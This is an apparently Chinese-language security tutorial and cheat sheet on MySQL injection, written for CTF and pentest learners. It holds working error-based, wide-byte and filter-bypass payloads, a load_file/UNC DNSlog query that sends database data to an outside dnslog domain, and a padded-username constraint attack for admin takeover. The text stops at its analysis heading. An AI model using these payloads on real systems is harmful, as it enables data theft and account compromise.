[TOC]
## 0x1 Forward
​
这篇文章的雏形我是发在了t00ls,后来我想了下还有其他挺有意思的内容还没总结进来,于是就有了一篇升级版（ps水货本质还是没变),希望有需要的师傅可以阅读看看。
## 0x2 MySQL 基础知识
#### 1.字符串截取函数
    left(str,index)  //从左边第index开始截取
    right(str,index) //从右边第index开始截取
    substring(str,index) //从左边index开始截取
    substr(str,index,len) //截取str,index开始,截取len的长度
    mid(str,index,ken) //截取str 从index开始,截取len的长度
#### 2.字符串比较
    strcmp(expr1,expr2) //如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1
    find_in_set(str,strlist) //如果相同则返回1不同则返回0
#### 3.字符串连接函数
    concat(str1,str2) //将字符串首尾相连
    concat_ws(separator,str1,str2) //将字符串用指定连接符连接
    group_concat()//
#### 4.一些绕过注入的罕见函数
    instr(str1,substr) //从子字符串中返回子串第一次出现的位置
    lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果
#### 5.运算符
##### 0x5.1算术运算符:
    + - * /
##### 0x5.2比较运算符:
`= <> != >  0`  
(3)like(模糊匹配) //`select '12345' like '12%' => true`  
(4)regexp 或 rlike(正则匹配)//`select '123455' regexp '^12' => true`
##### 0x5.3 逻辑运算符:
    not或! 非  
    AND 逻辑与 == &&
    OR 逻辑或 == ||
    XOR 逻辑异或 == ^
##### 0x5.4位运算符:
    & 按位与
    | 按位或
    ^ 按位异或
    ! 取反
    >右移
##### 0x5.6.注释符
    # //单行注释符,url记得编码为%23
    /**/ 
    --+
#### 6.常用函数
##### 0x6.1 延时函数
    sleep()
    benchmark(1000000,sha(1))
##### 0x6.2 编码函数
    hex() ascii()
#### 0x6.3 文件函数
    1.load_file  //读取文件
    2.outfile //写入文件
#### 7.一些构造语句的知识
##### 0x7.1 条件语句
    if(expr1,expr2,expr3) // expr1 true执行expr2否则执行expr3
    select case when (条件) then 代码1 else 代码 2 end
##### 0x7.2 information_schema 结构
    information_schema.tables:
    查询表名:table_name  对应的数据库名: table_schema
    information_schema.columns:
    查询列名:column_name 对应的表名:table_schemamysql盲注语句一般形式
    查询结果 + 比较运算符 + 猜测值
##### 0x7.3mysql 报错注入
`构造报错语句 + 查询结果`
##### 0x7.4 mysql 联合注入
`构造联合语句 + 查询结果`
##### 0x7.5 mysql 盲注
`查询结果 + 比较运算符 + 猜测值`
##### 0x7.6 mysql空白字符
    %20 %09 %0a %0b %0c %0d %a0 /**/ tab
    %a0 这个不会被php的\s进行匹配
    /*!*/ 内敛注释
     # 这个也可以用来做分隔 挺有意思
##### 0x7.7 some tips
###### 0x7.6.1函数名和括号直接可以插入特殊字符 ex
`concat/**/()`
`information_schema/**/./**/TABLES`
`information_schema%0a.%0aTABLES`
###### 0x7.6.2 {identifier expr}
​ `select {x 1} from {x test} limit 1;`
## 0x3 浅谈MYSQL报错注入(略)
**常见payload如下:**
* * *
    1.floor()
            and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)
        2.updatexml() //5.1.5
            and 1=(updatexml(1,concat(0x3a,(select user())),1))
        3.extractvalue() //5.1.5
            and extractvalue(1,concat(0x5c,(select user())))
        4.exp() //5.5.5版本之后可以使用
            select host from user where user = 'root' and Exp(~(select * from (select version())a));
        5.name_const //支持老版本
            select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;
        6.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错
            select multipoint((select * from (select * from (select * from (select version())a)b)c));
## 0x4 浅谈宽字节注入
原理介绍: [【PHP代码审计】入门之路——第二篇-宽字节注入](https://xz.aliyun.com/t/1719)  
**(1)MYSQL client链接编码的锅**  
查看编码:`show variables like '%character%'`  
当客户端连接编码设置为GBK的时候 与php进行交互的时候就会出现字符转换 导致单引号逃逸的问题。  
测试payload: `index.php?id=%df%27`  
流程: `%df%27->addslashes()->%df%5c%27->数据库交互gbk编码->运'`
**(2)MYSQL iconv函数 mb_convert_encoding函数的锅**  
借用先知: `$id =iconv('GBK','UTF-8', $id)`  
`%df%27===(addslashes)===>%df%5c%27===(iconv)===>%e5%5c%5c%27`  
其实就是 utf8 -> gbk ->utf-8 低位的%5c 也就是反斜杠干掉了转义单引号的反斜杠。  
**(3)Big5编码导致的宽字节注入**
> 之前有幸在ddctf 2017被虐过一次,当时就对这个点进行了一些小研究,比如编码的过程 由于当时啥也不懂,搞得有点奇怪,这里就记录一下
猜测代码: `iconv('utf-8','BIG5',$_GET['id'])`  
payload构造同上: 功' -> addsalshes -> 功\' -> iconv -> %A5%5C%5C%27->¥\' 逃逸单引号  
`%E8%B1%B9'` 参考安全客[DDCTF 2018 writeup(一)
WEB篇](https://www.anquanke.com/post/id/144879)
## 0x5 浅谈DNSlog SQL盲注
在mysql中load_file 会带dns查询请求  
具体可以参考 mysql带外攻击 out of band 安全客有这篇文章  
首先查看变量确定权限  
`show variables like '%secure%'`  
1、当`secure_file_priv`为空，就可以读取磁盘的目录。  
2、当`secure_file_priv`为G:\，就可以读取G盘的文件。  
3、当`secure_file_priv`为`null`，`load_file`就不能加载文件。  
在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数但是  
可以通过mysql的配置文件`my.ini`添加行进行配置  
unc路径 网络共享文件方式 `\\xq17.com\tet`这样的路径  
用4个\\\是因为转义 本质是:\  
最好进行加密处理 防止特殊字符导致失败 如下  
`select
load_file(concat(0x5c5c5c5c,version(),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263));`  
坑点:之前一直用bugscan的dnslog 用  
`select load_file('\\\\',version(),'.dnslog地址')` 发现一直收不到信息  
注意一般分配给我们的是二级域名所以我们要有个点 把返回信息放在三级域名那里 后来用16进制加密之后就发现可以了
可能是传输的时候出现了`@`之类什么奇怪的字符 导致了传输失败  
总结:
1.对数据能加密尽量加密  
2.dns解析 能很好解决盲打盲注的不可知的缺陷  
3.缺点是:限制比较多
推荐下我写的一篇dnslog花样秀任意读取文件:
[dnolog基础花样秀之盲注也能读配置文件](https://www.t00ls.net/thread-44273-1-1.html)
## 0x6 浅谈MYSQL的约束攻击
​
关于约束攻击,网上的文章归根到底其实说来说去就是一篇文章:[基于约束条件的SQL攻击](https://www.anquanke.com/post/id/85230),这里谈谈我的理解。
最近看了下bugku和安恒月赛的题目,约束攻击经常出现的点是在用户登录处。
首先 mysql 5.5版本以上需要设置数据库为宽松模式,避免出现插入错误error
`set @@sql_mode=ANSI;`
漏洞利用演示:
1.通过注册 admin+(n多个空格)+1(这个随意) => `admin /`
2.然后去登陆的时候: 输入 `admin`,password:你在第一步注册的账号密码,达到越权登陆admin账户
漏洞原理分析: